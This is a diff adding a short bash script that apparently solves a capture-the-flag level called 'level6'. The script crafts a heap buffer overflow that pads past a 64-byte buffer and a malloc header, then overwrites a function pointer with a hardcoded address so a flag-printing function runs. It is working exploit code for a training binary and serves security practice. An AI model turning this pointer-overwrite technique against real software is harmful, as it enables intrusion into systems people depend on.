@@ -1,0 +1,27 @@
+# Helper function, "put n s" print the string 's' n times
+put() { printf "$2%.0s" $(seq 1 "$1"); }
+
+# Helper function, "hex 41424344" gives "ABCD"
+hex() { echo "$1" | xxd -p -r; }
+
+# Helper function, "hex_little_endian 41424344" gives "DBCA"
+hex_little_endian() { hex $(printf "$1" | rev | fold -b2 | rev | tr -d '\n') ; }
+
+# 'main' function uses 'strcpy'
+# We can use a heap buffer overflow to overwrite '*f' with the address of 'n'
+
+# We fill the buffer
+BUFFER_SIZE=64
+BUFFER_FILLER="$(put "${BUFFER_SIZE}" A)"
+
+# We fill the malloc header
+MALLOC_HEADER_SIZE=8
+MALLOC_HEADER_FILLER="$(put "${MALLOC_HEADER_SIZE}" A)"
+
+# We overwrite the '*f' value with the address of 'n'
+N_ADDRESS=08048454
+F_REPLACEMENT="$(hex_little_endian "${N_ADDRESS}")"
+
+# Calling 'n' gives the flag
+INPUT="${BUFFER_FILLER}${MALLOC_HEADER_FILLER}${F_REPLACEMENT}"
+./level6 "${INPUT}"
